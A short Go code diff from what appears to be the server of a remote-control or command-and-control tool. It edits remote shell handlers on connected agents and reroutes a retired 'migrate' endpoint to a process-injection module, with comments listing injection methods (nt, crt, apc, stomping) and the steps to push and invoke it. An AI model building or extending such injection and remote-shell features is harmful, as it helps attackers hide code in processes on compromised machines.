@@ -12,6 +12,7 @@ import (
 
 	"cupcake-server/pkg/globals"
 	"cupcake-server/pkg/hub"
+	"cupcake-server/pkg/utils"
 	"cupcake-server/services"
 
 	"github.com/gin-gonic/gin"
@@ -19,10 +20,10 @@ import (
 	"github.com/google/uuid"
 )
 
-// upgrader 使用 globals 包中定义的全局实例
-var upgrader = globals.Upgrader
+// upgrader: browser-facing admin WS (PTY / shell) — empty Origin rejected
+var upgrader = globals.AdminUpgrader
 
-// openPtyStream opens a Yamux type-0x01 stream for interactive shell.
+// openPtyStream opens a Yamux PTY stream (YAMUX_STREAM_PTY) for interactive shell.
 func openPtyStream(client *globals.Client, uuidStr string) (*globals.PTYSession, error) {
 	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
 		return nil, fmt.Errorf("no yamux session")
@@ -31,7 +32,7 @@ func openPtyStream(client *globals.Client, uuidStr string) (*globals.PTYSession,
 	if err != nil {
 		return nil, err
 	}
-	if _, err := stream.Write([]byte{0x01}); err != nil {
+	if _, err := stream.Write([]byte{utils.YamuxStreamPTY}); err != nil {
 		stream.Close()
 		return nil, err
 	}
@@ -332,9 +333,13 @@ func HandleAdminShell(c *gin.Context) {
 }
 
 func MigrateClient(c *gin.Context) {
-	// Process injection / memory migration permanently removed from the agent.
+	// Legacy "migrate" API retired. Process inject is L2 module `inject`:
+	// 1) Build cupcake-mod-inject → storage/modules/inject.bin
+	// 2) POST /api/modules/push {uuid, id: inject}
+	// 3) command_type=process_inject JSON {pid, data:b64, method:nt|crt|apc|stomping|auto, wait_ms}
 	c.JSON(http.StatusGone, gin.H{
-		"error": "process migration/injection has been removed from this product",
+		"error": "legacy migration removed; use L2 module inject + process_inject command",
+		"hint":  "modules/push id=inject then process_inject method=nt|crt|apc|stomping",
 	})
 }
 
